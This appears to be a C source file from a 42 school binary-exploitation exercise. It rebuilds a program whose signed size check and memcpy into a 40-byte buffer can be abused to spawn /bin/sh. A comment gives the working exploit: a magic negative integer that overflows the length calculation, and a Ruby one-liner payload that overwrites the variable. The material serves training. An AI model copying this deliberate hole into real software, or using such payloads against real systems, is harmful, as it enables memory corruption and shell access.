/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bonus1.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/22 14:49:03 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/22 15:50:26 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <string.h>
#include <stdlib.h>
#include <unistd.h>

//magic value -2147483637
//ruby -e 'print "-2147483637 " + "x" * 40 + "\x46\x4c\x4f\x57"'

int		main(int argc, char **argv) {
	int		nb;
	char	str[40];

	nb = atoi(argv[1]);
	if (nb > 9)
		return (1);
	memcpy(str, argv[2], nb * 4);
	if (nb == 0x574f4c46)
		execl("/bin/sh", "sh", NULL);
	return (0);
}
